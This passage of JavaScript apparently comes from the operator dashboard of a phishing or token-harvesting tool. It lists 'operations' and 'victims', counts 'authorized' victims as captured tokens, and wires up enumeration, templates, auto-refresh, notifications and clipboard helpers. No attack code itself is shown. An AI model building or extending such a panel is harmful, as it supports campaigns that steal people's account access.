    // Update activity filter
    activityFilter.innerHTML = '<option value="">Select an operation</option>';
    operations.forEach(op => {
        activityFilter.innerHTML += `<option value="${op.id}">${escapeHtml(op.name)}</option>`;
    });
    activityFilter.value = currentActivityValue;
    
    // If there's a selected operation, update activity
    if (currentActivityValue) {
        updateActivity();
    }
}

function filterVictims() {
    updateVictims();
}

async function filterActivity() {
    await updateActivity();
}

// ==================== AUTO UPDATE ====================

function startAutoUpdate() {
    // Update every 5 seconds
    updateInterval = setInterval(async () => {
        await Promise.all([
            updateStats(),
            updateOperations(),
            updateVictims()
        ]);
        
        // Update activity if an operation is selected
        const activityFilter = document.getElementById('activity-filter');
        if (activityFilter && activityFilter.value) {
            await updateActivity();
        }
    }, 5000);
}

function stopAutoUpdate() {
    if (updateInterval) {
        clearInterval(updateInterval);
        updateInterval = null;
    }
}

// ==================== NOTIFICATION SYSTEM ====================

function showNotification(title, message, type = 'info', url = null, duration = 5000) {
    const container = document.getElementById('notification-container');
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    // Icon based on type
    const icons = {
        success: '✓',
        error: '✕',
        warning: '⚠',
        info: 'ℹ'
    };
    
    let html = `
        <div class="notification-icon">${icons[type] || icons.info}</div>
        <div class="notification-content">
            <div class="notification-title">${escapeHtml(title)}</div>
            <div class="notification-message">${escapeHtml(message)}</div>
    `;
    
    // Add URL if provided
    if (url) {
        html += `
            <div class="notification-url">
                <span class="notification-url-text">${escapeHtml(url)}</span>
                <button class="notification-url-copy" data-copy-text="${escapeHtml(url)}">Copy</button>
            </div>
        `;
    }
    
    html += `
        </div>
        <button class="notification-close" onclick="closeNotification(this)">×</button>
    `;
    
    notification.innerHTML = html;
    container.appendChild(notification);
    
    // Auto-remove after duration
    if (duration > 0) {
        setTimeout(() => {
            closeNotification(notification.querySelector('.notification-close'));
        }, duration);
    }
}

function closeNotification(button) {
    const notification = button.closest('.notification');
    notification.classList.add('hiding');
    setTimeout(() => {
        notification.remove();
    }, 300);
}

function showConfirmation(title, message, onConfirm) {
    const container = document.getElementById('notification-container');
    const notification = document.createElement('div');
    notification.className = 'notification warning';
    
    let html = `
        <div class="notification-icon">⚠</div>
        <div class="notification-content">
            <div class="notification-title">${escapeHtml(title)}</div>
            <div class="notification-message">${escapeHtml(message)}</div>
            <div style="margin-top: 15px; display: flex; gap: 10px;">
                <button class="btn btn-secondary btn-small" onclick="closeNotification(this.closest('.notification').querySelector('.notification-close'))">Cancel</button>
                <button class="btn btn-primary btn-small" onclick="confirmAction(this)">Confirm</button>
            </div>
        </div>
        <button class="notification-close" onclick="closeNotification(this)" style="display: none;">×</button>
    `;
    
    notification.innerHTML = html;
    notification.dataset.onConfirm = 'pending';
    container.appendChild(notification);
    
    // Store the callback
    notification._confirmCallback = onConfirm;
}

function confirmAction(button) {
    const notification = button.closest('.notification');
    const callback = notification._confirmCallback;
    
    // Close notification
    closeNotification(notification.querySelector('.notification-close'));
    
    // Execute callback
    if (callback && typeof callback === 'function') {
        callback();
    }
}

// ==================== UTILITY FUNCTIONS ====================

function getVictimCount(operationId) {
    return currentVictims.filter(v => v.operation_id === operationId).length;
}

function getTokenCount(operationId) {
    return currentVictims.filter(v => 
        v.operation_id === operationId && v.status === 'authorized'
    ).length;
}

function formatDate(dateString) {
    if (!dateString) return 'N/A';
    const date = new Date(dateString);
    return date.toLocaleDateString();
}

function formatDateTime(dateString) {
    if (!dateString) return 'N/A';
    const date = new Date(dateString);
    return date.toLocaleString();
}

function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function copyToClipboard(text, button = null) {
    // Try modern clipboard API first
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            if (button) {
                const originalText = button.textContent;
                button.textContent = 'Copied!';
                button.style.background = '#108548';
                setTimeout(() => {
                    button.textContent = originalText;
                    button.style.background = '';
                }, 2000);
            } else {
                showNotification('Copied!', 'Text copied to clipboard', 'success', null, 2000);
            }
        }).catch(err => {
            console.error('Clipboard API failed:', err);
            // Fallback to execCommand
            fallbackCopyToClipboard(text, button);
        });
    } else {
        // Fallback for older browsers or HTTP contexts
        fallbackCopyToClipboard(text, button);
    }
}

function fallbackCopyToClipboard(text, button = null) {
    // Create a temporary textarea element
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.top = '0';
    textarea.style.left = '0';
    textarea.style.width = '2em';
    textarea.style.height = '2em';
    textarea.style.padding = '0';
    textarea.style.border = 'none';
    textarea.style.outline = 'none';
    textarea.style.boxShadow = 'none';
    textarea.style.background = 'transparent';
    document.body.appendChild(textarea);
    textarea.focus();
    textarea.select();
    
    try {
        const successful = document.execCommand('copy');
        if (successful) {
            if (button) {
                const originalText = button.textContent;
                button.textContent = 'Copied!';
                button.style.background = '#108548';
                setTimeout(() => {
                    button.textContent = originalText;
                    button.style.background = '';
                }, 2000);
            } else {
                showNotification('Copied!', 'Text copied to clipboard', 'success', null, 2000);
            }
        } else {
            throw new Error('execCommand failed');
        }
    } catch (err) {
        console.error('Fallback copy failed:', err);
        showNotification('Copy Failed', 'Please copy manually: ' + text, 'error', null, 5000);
    } finally {
        document.body.removeChild(textarea);
    }
}

// Export functions for inline onclick handlers
window.showCreateOperationModal = showCreateOperationModal;
window.closeCreateOperationModal = closeCreateOperationModal;
window.closeVictimDetailsModal = closeVictimDetailsModal;
window.showResetDatabaseModal = showResetDatabaseModal;
window.closeResetDatabaseModal = closeResetDatabaseModal;
window.checkResetConfirmation = checkResetConfirmation;
window.resetDatabase = resetDatabase;
window.showEnumerationModal = showEnumerationModal;
window.closeEnumerationModal = closeEnumerationModal;
window.closeEnumerationProgressModal = closeEnumerationProgressModal;
window.closeEnumerationResultsModal = closeEnumerationResultsModal;
window.viewEnumerationResults = viewEnumerationResults;
window.startEnumeration = startEnumeration;
window.createOperation = createOperation;
window.startOperation = startOperation;
window.stopOperation = stopOperation;
window.deleteOperation = deleteOperation;
window.viewOperationDetails = viewOperationDetails;
window.viewVictimDetails = viewVictimDetails;
window.toggleBaseUrl = toggleBaseUrl;
window.loadTemplate = loadTemplate;
window.filterVictims = filterVictims;
window.filterActivity = filterActivity;
window.copyToClipboard = copyToClipboard;
window.showNotification = showNotification;
window.closeNotification = closeNotification;
window.showConfirmation = showConfirmation;
window.confirmAction = confirmAction;
